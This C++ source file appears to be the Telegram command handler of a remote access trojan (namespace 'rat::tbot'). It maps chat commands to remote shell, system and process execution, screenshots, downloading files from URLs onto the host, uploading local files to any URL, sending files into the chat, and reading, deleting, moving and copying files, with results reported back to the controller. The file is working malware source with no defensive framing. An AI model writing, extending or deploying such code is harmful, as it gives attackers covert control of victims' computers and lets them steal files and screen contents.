#include "rat/system.hpp"
#include "rat/tbot/handler/handleUpdate.hpp"

#include <cstdint>
#include "logging.hpp"
#include "rat/networking.hpp"

namespace rat::tbot::handler {


static uint16_t __stringToUint16(const std::string& str);
static  std::string _handlePwdCommand(void);
static  std::string _handleCdCommand(const Command& arg_Command);
static  std::string _handleLsCommand(const Command& arg_Command);
static  std::string _handleReadCommand(const Command& arg_Command);
static  std::string _handleTouchCommand(const Command& arg_Command);
static  std::string _handleGetCommand(const Bot& arg_Bot, const Command& arg_Command);
static std::string  _handleStatCommand(const Command& arg_Command);
static std::string  _handleDownloadCommand(const Command& arg_Command);
static std::string _handleUploadCommand(const Command& arg_Command);
static std::string _handleRmCommand(const Command& arg_Command);
static std::string _handleMvCommand(const Command& arg_Command);
static std::string _handleCpCommand(const Command& arg_Command);
static std::string _handleSetCommand(Bot& arg_Bot, const Command& arg_Command);

static std::string _handleMessageWithUploadedFiles(const Message& Telegram_Message);


// ---------- Main Command Dispatcher ----------
static std::string _handleCommand(Bot& arg_Bot, Message& Telegram_Message) {
    if (Telegram_Message.text.empty() || Telegram_Message.text[0] != '/') {
        return "Not a command";
    }

    const char* text = Telegram_Message.text.c_str();

    // Launch separate processes on detached threads
    if (strncmp(text, "/sh", 3) == 0) {
        std::thread([&arg_Bot, telegram_message = Telegram_Message]() mutable{
            
            std::string result = _parseAndHandleShellCommand(telegram_message);
            // debug output
            std::cout << "[DEBUG] /sh command completed: " << result << "\n";
            arg_Bot.sendMessage(result);
        }).detach();
        return "Executing shell command asynchronously...";
    }

    if (strncmp(text, "/sys", 4) == 0) {
        std::thread([&arg_Bot, msg = Telegram_Message]() mutable {
            
            std::string result = _parseAndHandleSystemCommand(arg_Bot, msg);
            
            arg_Bot.sendMessage(result);
            DEBUG_LOG("/sys command completed: {}", result);

        }).detach();
        return "Executing system command asynchronously...";
    }

    if (strncmp(text, "/process", 8) == 0) {
        std::thread([&arg_Bot, msg = Telegram_Message]() mutable {
            
            std::string result = _parseAndHandleProcessCommand(arg_Bot, msg);
            
            arg_Bot.sendMessage(result);
            
            DEBUG_LOG("/process command completed: {}", result);
        }).detach();
        return "Executing process command asynchronously...";
    }

    if (strncmp(text, "/screenshot", 11) == 0) {
        std::thread([&arg_Bot]() mutable {
            std::string result = _handleScreenshotCommand(arg_Bot);
            arg_Bot.sendMessage(result);
            DEBUG_LOG("[DEBUG] /screenshot command completed");
        }).detach();
        return "Taking screenshot asynchronously...";
    }

    Command arg_Command = _parseTelegramMessageToCommand(Telegram_Message);

    // Asynchronous file commands using TinyProcess
    if (arg_Command.directive == "/download") {
        std::thread([botCopy = arg_Bot, cmd = arg_Command]() mutable {
            std::string result = _handleDownloadCommand(cmd);
            botCopy.sendMessage(result);
            DEBUG_LOG("/download command completed");
        }).detach();
        return "Downloading file asynchronously...";
    }

    if (arg_Command.directive == "/upload") {
        std::thread([botCopy = arg_Bot, cmd = arg_Command]() mutable {
            std::string result = _handleUploadCommand(cmd);
            botCopy.sendMessage(result);
            DEBUG_LOG("/upload command completed");
        }).detach();
        return "Uploading file asynchronously...";
    }

    // Synchronous commands
    if (arg_Command.directive == "/set") return         _handleSetCommand(arg_Bot, arg_Command);
    if (arg_Command.directive == "/pwd") return         _handlePwdCommand();
    if (arg_Command.directive == "/cd") return          _handleCdCommand(arg_Command);
    if (arg_Command.directive == "/ls") return          _handleLsCommand(arg_Command);
    if (arg_Command.directive == "/read") return        _handleReadCommand(arg_Command);
    if (arg_Command.directive == "/touch") return       _handleTouchCommand(arg_Command);
    if (arg_Command.directive == "/get") return         _handleGetCommand(arg_Bot, arg_Command);
    if (arg_Command.directive == "/stat") return        _handleStatCommand(arg_Command);
    if (arg_Command.directive == "/rm") return          _handleRmCommand(arg_Command);
    if (arg_Command.directive == "/mv") return          _handleMvCommand(arg_Command);
    if (arg_Command.directive == "/cp") return          _handleCpCommand(arg_Command);

    return fmt::format("Unknown command: {}", arg_Command.directive);
}


/*ALL of this module does is expose this one function handleUpdate()*/
// ---------- Entry Point ----------
void handleUpdate(Bot& arg_Bot, const Update& arg_Update) {
    Message telegram_message = std::move(arg_Update.message);
    if (telegram_message.id == 0) return;

    std::string response;

    response = _handleMessageWithUploadedFiles(telegram_message);
    if (!response.empty()) {
        arg_Bot.sendMessage(response);
        return;
    }

    response = _handleCommand(arg_Bot, telegram_message);
    if (!response.empty()) {
        arg_Bot.sendMessage(response);
        return;
    }

    DEBUG_LOG("No handler produced a response for message_id {}", telegram_message.id);
}
// ---------- Helper ----------
static uint16_t __stringToUint16(const std::string& str) {
    try {
        unsigned long value = std::stoul(str);
        if (value > static_cast<unsigned long>(std::numeric_limits<uint16_t>::max())) {
            throw std::out_of_range("Value too large for uint16_t");
        }
        return static_cast<uint16_t>(value);
    }
    catch (const std::invalid_argument&) {
        throw std::invalid_argument("Invalid input: not a number");
    }
    catch (const std::out_of_range&) {
        throw std::out_of_range("Invalid input: out of range");
    }
}



// ---------- Command Handlers ----------
static std::string _handlePwdCommand(void) {
    return rat::system::pwd();
}

static std::string _handleCdCommand(const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No path specified";
    const std::string& param = arg_Command.parameters[0];
    return rat::system::cd(rat::system::normalizePath(param));
}

static  std::string _handleLsCommand(const Command& arg_Command) {
    std::string path = "";
    if (!arg_Command.parameters.empty()) {
        path = arg_Command.parameters[0];
    }
    return rat::system::ls(rat::system::normalizePath(path));
}

static std::string _handleReadCommand(const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No file specified";
    const std::string param = arg_Command.parameters[0];
    return rat::system::readFile(rat::system::normalizePath(param));
}

static std::string _handleTouchCommand(const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No file specified";
    std::string response;
    bool success = false;
    for (size_t i = 0; i < arg_Command.parameters.size(); ++i) {
        success = rat::system::createFile(std::filesystem::path(arg_Command.parameters[i]));
        response += fmt::format("file: {} was {}\n",
            arg_Command.parameters[i],
            success ? "created" : "not created");
    }
    return response;
}
static  std::string _handleGetCommand(const Bot& arg_Bot, const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No file specified";
    auto file_path = std::filesystem::path(arg_Command.parameters[0]);
    if (std::filesystem::exists(file_path)) {
        arg_Bot.sendFile(file_path);
        return "File Uploaded to chat";
    }
    return "File Does not exist";
}

static std::string _handleStatCommand(const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No file specified";
    std::filesystem::path p(arg_Command.parameters[0]);
    if (!std::filesystem::exists(p)) {
        return fmt::format("File does not exist: {}", arg_Command.parameters[0]);
    }

    return fmt::format(
        "File: {}\nSize: {} bytes\nLast modified: {}",
        p.string(),
        std::filesystem::file_size(p),
        std::filesystem::last_write_time(p).time_since_epoch().count()
    );
}

static std::string _handleDownloadCommand(const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "Usage: /download <url> [path]";
    std::string url = arg_Command.parameters[0];
    std::filesystem::path file_path;

    if (arg_Command.parameters.size() == 1) {
        file_path = rat::networking::_getFilePathFromUrl(url);
    } else {
        file_path = arg_Command.parameters[1];
        if (std::filesystem::is_directory(file_path)) {
            file_path /= rat::networking::_getFilePathFromUrl(url);
        }
    }

    auto networking_response = rat::networking::downloadFile(url, file_path);
    switch (networking_response.status) {
        case networking::NetworkingResponseStatus::SUCCESS: {
            auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(networking_response.duration).count();
            return fmt::format("File: {} downloaded in {} ms", file_path.string(), ms);
        }
        case networking::NetworkingResponseStatus::FILE_CREATION_FAILURE:
            return fmt::format("Failed to create file: {}", file_path.string());
        case networking::NetworkingResponseStatus::CONNECTION_FAILURE:
            return "Connection failure during download";
        case networking::NetworkingResponseStatus::INVALID_URL:
            return "Invalid URL";
        default:
            return "Unknown download error";
    }
}

static std::string _handleUploadCommand(const Command& arg_Command) {
    if (arg_Command.parameters.size() < 2) return "Usage: /upload <filepath> <url>";
    std::filesystem::path file_path = arg_Command.parameters[0];
    if (!std::filesystem::exists(file_path)) return "File not found";
    std::string url = arg_Command.parameters[1];

    auto net_resp = rat::networking::uploadFile(file_path, url);
    switch (net_resp.status) {
        case networking::NetworkingResponseStatus::SUCCESS: {
            auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(net_resp.duration).count();
            return fmt::format("Uploaded '{}' in {} ms", file_path.string(), ms);
        }
        case networking::NetworkingResponseStatus::CONNECTION_FAILURE:
            return "Connection failure during upload";
        default:
            return "Upload failed";
    }
}

static std::string _handleRmCommand(const Command& arg_Command) {
    if (arg_Command.parameters.empty()) return "No file specified";
    std::string response;
    bool success = false;
    for (size_t i = 0; i < arg_Command.parameters.size(); ++i) {
        const auto path = std::filesystem::path(arg_Command.parameters[i]);
        if (!std::filesystem::exists(path)) {
            response += fmt::format("file: {} does not exist, cannot be removed\n", path.string());
            continue;
        }

        success = rat::system::removeFile(path);
        response += fmt::format("file: {} was {}\n",
            arg_Command.parameters[i],
            success ? "removed" : "not removed");
    }
    return response;
}

static std::string _handleMvCommand(const Command& arg_Command) {
    if (arg_Command.parameters.size() < 2) return "Usage: /mv <src> <dest>";
    const auto source_path = std::filesystem::path(arg_Command.parameters[0]);
    const auto dist_path = std::filesystem::path(arg_Command.parameters[1]);

    if (!std::filesystem::exists(source_path)) {
        return fmt::format("Source path {} does not exist", source_path.string());
    }

    if (rat::system::isFile(source_path)) {
        if (rat::system::isDir(dist_path)) {
            if (rat::system::renameFile(source_path, dist_path / source_path.filename())) {
                return fmt::format("File {} has been successfully moved to {}",
                    source_path.string(), (dist_path / source_path.filename()).string());
            }
            return fmt::format("Failed to move file {} to {}",
                source_path.string(), dist_path.string());
        }

        if (rat::system::renameFile(source_path, dist_path)) {
            return fmt::format("File {} has been successfully renamed to {}",
                source_path.string(), dist_path.string());
        }
        return fmt::format("Failed to rename file {} to {}",
            source_path.string(), dist_path.string());
    }

    if (rat::system::moveDir(source_path, dist_path)) {
        return fmt::format("Directory {} has been successfully moved to {}",
            source_path.string(), dist_path.string());
    }
    return fmt::format("Failed to move directory {} to {}",
        source_path.string(), dist_path.string());
}

static std::string _handleCpCommand(const Command& arg_Command) {
    if (arg_Command.parameters.size() < 2) return "Usage: /cp <src> <dest>";
    const auto source_path = std::filesystem::path(arg_Command.parameters[0]);
    if (!std::filesystem::exists(source_path)) {
        return fmt::format("Path: {} does not exist", source_path.string());
    }

    const auto dist_path = std::filesystem::path(arg_Command.parameters[1]);
    if (std::filesystem::exists(dist_path)) {
        return fmt::format("Path {} already exists, overwrite disabled", dist_path.string());
    }

    const bool source_path_is_file = rat::system::isFile(source_path);
    const bool dist_path_is_file = rat::system::isFile(dist_path);
    bool result = false;

    if (source_path_is_file && dist_path_is_file) {
        result = rat::system::copyFile(source_path, dist_path);
    } else if (source_path_is_file && !dist_path_is_file) {
        result = rat::system::copyFile(source_path, dist_path / source_path.filename());
    } else if (!source_path_is_file && !dist_path_is_file) {
        result = rat::system::copyDir(source_path, dist_path);
    }

    if (result) {
        return fmt::format("Content of {} copied to {}", source_path.string(), dist_path.string());
    }
    return fmt::format("Failed to copy {} to {}", source_path.string(), dist_path.string());
}

static std::string _handleSetCommand(Bot& arg_Bot, const Command& arg_Command) {
    if (arg_Command.parameters.empty()) {
        return "/set <variable> <value>";
    }

    const std::string& variable = arg_Command.parameters[0];
    if (variable == "update_interval") {
        if (arg_Command.parameters.size() < 2) {
            return "Missing value for update_interval";
        }

        try {
            uint16_t update_interval = __stringToUint16(arg_Command.parameters[1]);
            arg_Bot.setUpdateIterval(update_interval);
            return fmt::format("Bot's update_interval == {}", update_interval);
        }
        catch (const std::exception& e) {
            return fmt::format("Error setting update_interval: {}", e.what());
        }
    }

    return fmt::format("Unknown variable: {}", variable);
}

static std::string _handleMessageWithUploadedFiles(const Message& Telegram_Message) {
    if (Telegram_Message.files.empty()) return "";
    return fmt::format("Received {} uploaded file(s)", Telegram_Message.files.size());
}




} // namespace rat::tbot
